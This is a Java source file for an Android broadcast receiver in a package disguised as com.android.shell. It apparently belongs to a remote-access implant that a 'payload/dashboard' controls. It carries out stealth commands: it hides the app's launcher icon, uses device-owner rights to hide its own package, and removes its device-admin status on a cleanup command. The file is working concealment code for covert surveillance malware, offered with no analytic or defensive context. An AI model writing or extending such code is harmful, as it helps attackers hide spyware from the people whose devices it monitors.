package com.android.shell.ghost;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Remote lifecycle controls fired by the payload/dashboard.
 *  com.betterdesk.HIDE  -> hide the wrapper icon
 *  com.betterdesk.SHOW  -> restore the wrapper icon
 *  com.betterdesk.CLEANUP -> drop device-admin
 */
public class GhostCleanupReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(context, GhostDeviceAdmin.class);
        Log.d("GhostHide", "cleanup action=" + action);
        if ("com.betterdesk.HIDE".equals(action)) {
            GhostAccessibilityService.hideLauncher(context);
            try {
                if (dpm != null && dpm.isDeviceOwnerApp(context.getPackageName())) {
                    dpm.setApplicationHidden(admin, context.getPackageName(), true);
                }
            } catch (Throwable t) {
                Log.e("GhostHide", "hide self fail", t);
            }
            return;
        }
        if ("com.betterdesk.SHOW".equals(action)) {
            GhostAccessibilityService.showLauncher(context);
            try {
                if (dpm != null && dpm.isDeviceOwnerApp(context.getPackageName())) {
                    dpm.setApplicationHidden(admin, context.getPackageName(), false);
                }
            } catch (Throwable ignored) {}
            return;
        }
        if (dpm != null && dpm.isAdminActive(admin)) dpm.removeActiveAdmin(admin);
    }
}
